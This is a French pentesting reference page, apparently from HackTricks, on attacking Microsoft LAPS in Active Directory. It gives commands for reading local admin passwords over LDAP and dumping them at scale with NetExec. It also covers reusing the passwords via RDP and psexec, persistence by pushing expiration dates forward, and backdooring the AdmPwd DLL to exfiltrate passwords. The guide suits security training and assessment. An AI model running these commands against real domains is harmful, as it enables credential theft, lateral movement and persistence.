# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Il existe actuellement **2 variantes de LAPS** que vous pouvez rencontrer lors d’une évaluation :

- **Legacy Microsoft LAPS** : stocke le mot de passe de l’administrateur local dans **`ms-Mcs-AdmPwd`** et le temps d’expiration dans **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (intégré à Windows depuis les mises à jour d’avril 2023) : peut toujours émuler le mode legacy, mais en mode natif il utilise des attributs **`msLAPS-*`**, prend en charge le **chiffrement du mot de passe**, **l’historique des mots de passe** et la **sauvegarde du mot de passe DSRM** pour les contrôleurs de domaine.

LAPS est conçu pour gérer les **mots de passe de l’administrateur local**, en les rendant **uniques, aléatoires et fréquemment modifiés** sur les ordinateurs joints au domaine. Si vous pouvez lire ces attributs, vous pouvez généralement **pivot comme le local admin** vers l’hôte concerné. Dans de nombreux environnements, l’élément intéressant n’est pas seulement de lire le mot de passe lui-même, mais aussi de déterminer **qui avait reçu l’accès délégué** aux attributs du mot de passe.

### Attributs de Legacy Microsoft LAPS

Dans les objets ordinateur du domaine, l’implémentation de Legacy Microsoft LAPS entraîne l’ajout de deux attributs :

- **`ms-Mcs-AdmPwd`** : **mot de passe de l’administrateur en clair**
- **`ms-Mcs-AdmPwdExpirationTime`** : **temps d’expiration du mot de passe**

### Attributs de Windows LAPS

Windows LAPS natif ajoute plusieurs nouveaux attributs aux objets ordinateur :

- **`msLAPS-Password`** : blob de mot de passe en clair stocké en JSON lorsque le chiffrement n’est pas activé
- **`msLAPS-PasswordExpirationTime`** : heure d’expiration planifiée
- **`msLAPS-EncryptedPassword`** : mot de passe actuel chiffré
- **`msLAPS-EncryptedPasswordHistory`** : historique des mots de passe chiffrés
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`** : données chiffrées du mot de passe DSRM pour les contrôleurs de domaine
- **`msLAPS-CurrentPasswordVersion`** : suivi de version basé sur GUID utilisé par la logique plus récente de détection de rollback (schéma de forêt Windows Server 2025)

Lorsque **`msLAPS-Password`** est lisible, la valeur est un objet JSON contenant le nom du compte, l’heure de mise à jour et le mot de passe en clair, par exemple :
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Vérifier si activé
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Accès au mot de passe LAPS

Vous pouvez **télécharger la stratégie brute LAPS** depuis `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` puis utiliser **`Parse-PolFile`** du package [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) pour convertir ce fichier en format lisible par l’humain.

### Cmdlets PowerShell LAPS Microsoft legacy

Si le module LAPS legacy est installé, les cmdlets suivantes sont généralement disponibles :
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Cmdlets PowerShell de Windows LAPS

Windows LAPS natif est livré avec un nouveau module PowerShell et de nouveaux cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Quelques détails opérationnels comptent ici :

- **`Get-LapsADPassword`** gère automatiquement **legacy LAPS**, **clear-text Windows LAPS** et **encrypted Windows LAPS**.
- Si le mot de passe est chiffré et que vous pouvez le **read** mais pas le **decrypt**, le cmdlet renvoie les métadonnées mais pas le mot de passe en clear-text.
- **Password history** n’est disponible que lorsque le chiffrement de **Windows LAPS** est activé.
- Sur les domain controllers, la source renvoyée peut être **`EncryptedDSRMPassword`**.

### PowerView / LDAP

**PowerView** peut aussi être utilisé pour découvrir **who can read the password and read it** :
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Si **`msLAPS-Password`** est lisible, parsez le JSON renvoyé et extrayez **`p`** pour le mot de passe et **`n`** pour le nom du compte administrateur local géré.

### Linux / remote tooling

Les outils modernes prennent en charge à la fois l’ancien Microsoft LAPS et Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notes :

- Les builds récents de **NetExec** prennent en charge **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** et **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** reste utile pour l’ancien **Microsoft LAPS** depuis Linux, mais il ne cible que **`ms-Mcs-AdmPwd`**.
- Si l’environnement utilise **encrypted Windows LAPS**, une simple lecture LDAP ne suffit pas ; il faut aussi être un **authorized decryptor** ou abuser d’un chemin de déchiffrement supporté.

### Directory synchronization abuse

Si vous avez des droits de **directory synchronization** au niveau du domaine au lieu d’un accès direct en lecture sur chaque objet ordinateur, LAPS peut quand même être intéressant.

La combinaison de **`DS-Replication-Get-Changes`** avec **`DS-Replication-Get-Changes-In-Filtered-Set`** ou **`DS-Replication-Get-Changes-All`** peut être utilisée pour synchroniser des attributs **confidential / RODC-filtered** tels que l’ancien **`ms-Mcs-AdmPwd`**. BloodHound modélise cela comme **`SyncLAPSPassword`**. Consultez [DCSync](dcsync.md) pour le contexte sur les droits de réplication.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilite l’énumération de LAPS avec plusieurs fonctions.\
L’une d’elles consiste à analyser **`ExtendedRights`** pour **tous les ordinateurs avec LAPS activé.** Cela montre les **groupes** spécifiquement **délégués pour lire les mots de passe LAPS**, qui sont souvent des utilisateurs dans des groupes protégés.\
Un **compte** qui a **rejoint un ordinateur** à un domaine reçoit `All Extended Rights` sur cet hôte, et ce droit donne au **compte** la capacité de **lire les mots de passe**. L’énumération peut révéler un compte utilisateur capable de lire le mot de passe LAPS sur un hôte. Cela peut nous aider à **cibler des utilisateurs AD spécifiques** qui peuvent lire les mots de passe LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Si vous n'avez pas de PowerShell interactif, vous pouvez abuser de ce privilège à distance via LDAP :
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Cela extrait tous les secrets LAPS que l'utilisateur peut lire, vous permettant de vous déplacer latéralement avec un mot de passe administrateur local différent.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistance LAPS

### Date d’expiration

Une fois admin, il est possible d’**obtenir les mots de passe** et d’**empêcher** une machine de **mettre à jour** son **mot de passe** en **définissant la date d’expiration dans le futur**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS utilise **`msLAPS-PasswordExpirationTime`** à la place:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Le mot de passe tournera quand même si un **admin** utilise **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ou si **Do not allow password expiration time longer than required by policy** est activé.

### Récupérer les mots de passe historiques depuis les sauvegardes AD

Lorsque **Windows LAPS encryption + password history** est activé, les sauvegardes AD montées peuvent devenir une source supplémentaire de secrets. Si vous pouvez accéder à un snapshot AD monté et utiliser le **recovery mode**, vous pouvez interroger d’anciens mots de passe stockés sans parler à un DC en direct.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Ceci est surtout pertinent lors d'un **vol de sauvegarde AD**, d'un **abus de forensique hors ligne** ou d'un **accès aux supports de disaster-recovery**.

### Backdoor

Le code source original pour l'ancien Microsoft LAPS se trouve [ici](https://github.com/GreyCorbel/admpwd), il est donc possible d'ajouter une backdoor dans le code (dans la méthode `Get-AdmPwdPassword` dans `Main/AdmPwd.PS/Main.cs` par exemple) qui va d'une manière ou d'une autre **exfiltrer les nouveaux mots de passe ou les stocker quelque part**.

Ensuite, compilez le nouveau `AdmPwd.PS.dll` et téléversez-le sur la machine dans `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (et modifiez l'heure de modification).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
